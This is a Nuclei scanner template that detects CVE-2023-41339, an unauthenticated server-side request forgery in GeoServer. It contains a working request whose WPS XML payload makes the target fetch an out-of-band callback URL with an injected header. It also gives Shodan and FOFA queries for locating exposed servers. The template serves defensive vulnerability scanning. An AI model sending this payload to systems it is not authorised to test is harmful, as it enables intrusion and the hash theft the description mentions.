id: CVE-2023-41339

info:
  name: Unauthenticated GeoServer WMS - Server Side Request Forgery & CRLF Injection
  author: DhiyaneshDK
  severity: high
  description: |
    GeoServer is an open source software server written in Java that allows users to share and edit geospatial data. The WMS specification defines an ``sld=<url>`` parameter for GetMap, GetLegendGraphic and GetFeatureInfo operations for user supplied "dynamic styling". Enabling the use of dynamic styles, without also configuring URL checks, provides the opportunity for Service Side Request Forgery. This vulnerability can be used to steal user NetNTLMv2 hashes which could be relayed or cracked externally to gain further access.
  remediation: This vulnerability has been patched in versions 2.22.5 and 2.23.2.
  reference:
    - https://www.synacktiv.com/advisories/unauthenticated-server-side-request-forgery-crlf-injection-in-geoserver-wms.html
    - https://github.com/geoserver/geoserver/security/advisories/GHSA-cqpc-x2c6-2gmf
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:L
    cvss-score: 8.6
    cve-id: CVE-2023-41339
    cwe-id: CWE-918
    epss-score: 0.00063
    epss-percentile: 0.25293
    cpe: cpe:2.3:a:osgeo:geoserver:*:*:*:*:*:*:*:*
  metadata:
    vendor: osgeo
    product: geoserver
    verified: true
    max-request: 1
    shodan-query: title:"GeoServer"
    fofa-query: app="GeoServer"
  tags: cve,cve2023,geoserver,ssrf,oast,oos

variables:
  oast: "{{interactsh-url}}"
  string: "{{to_lower(rand_text_alpha(4))}}"
  value: "{{to_lower(rand_text_alpha(5))}}"

http:
  - raw:
      - |
        POST {{path}} HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/xml

        <?xml version="1.0" encoding="UTF-8"?>
        <wps:Execute version="1.0.0" service="WPS" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
        xmlns="http://www.opengis.net/wps/1.0.0" xmlns:wfs="http://www.opengis.net/wfs" 
        xmlns:wps="http://www.opengis.net/wps/1.0.0" xmlns:ows="http://www.opengis.net/ows/1.1" 
        xmlns:gml="http://www.opengis.net/gml" xmlns:ogc="http://www.opengis.net/ogc" 
        xmlns:wcs="http://www.opengis.net/wcs/1.1.1" xmlns:xlink="http://www.w3.org/1999/xlink" 
        xsi:schemaLocation="http://www.opengis.net/wps/1.0.0 http://schemas.opengis.net/wps/1.0.0/wpsAll.xsd">
        <ows:Identifier>JTS:area</ows:Identifier>  <wps:DataInputs>    <wps:Input>
        <ows:Identifier>geom</ows:Identifier>
        <wps:Reference mimeType="application/json" xlink:href="http://{{oast}}" method="GET">
        <wps:Header key="{{string}}" value="{{value}}"/> </wps:Reference>
        </wps:Input></wps:DataInputs>  <wps:ResponseForm>    <wps:RawDataOutput>
        <ows:Identifier>result</ows:Identifier></wps:RawDataOutput></wps:ResponseForm></wps:Execute>

    payloads:
      path:
        - /wms
        - /geoserver/wms

    matchers:
      - type: dsl
        dsl:
          - contains(interactsh_protocol, 'http')
          - contains_all(to_lower(interactsh_request), '{{string}}','{{value}}')
          - status_code == 200
        condition: and
